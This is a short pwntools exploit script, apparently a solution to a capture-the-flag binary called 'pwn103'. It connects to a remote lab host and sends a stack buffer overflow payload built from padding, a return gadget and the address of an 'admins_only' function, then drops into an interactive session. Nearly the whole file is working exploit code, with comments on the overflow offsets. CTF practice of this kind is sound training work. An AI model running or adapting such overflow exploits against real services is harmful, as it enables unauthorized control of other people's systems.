'''
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
'''

from pwn import *

# for taking advantage of the static symbols (like addresses in the given function) in the program
context.binary = binary = ELF("./pwn103.pwn103")
# context.binary = binary = "./pwn103.pwn103"


# p = process("./pwn103.pwn103")
p = remote('10.10.118.249', 9003)
p.recv()
p.sendline(b'3')

# take advantage of the static symbol (admins_only)
# Should change the value into little endian in 8bytes
# admins_only_address = p64(binary.symbols.admins_only)
# payload = b"A"*(0x20+0x8) + admins_only_address

# Should add return gadget before returning into function
return_address = p64(0x00401677)
admins_only_address = p64(0x00401554)
payload = b"A"*(0x20+0x8) + return_address + admins_only_address

p.sendline(payload)
p.interactive()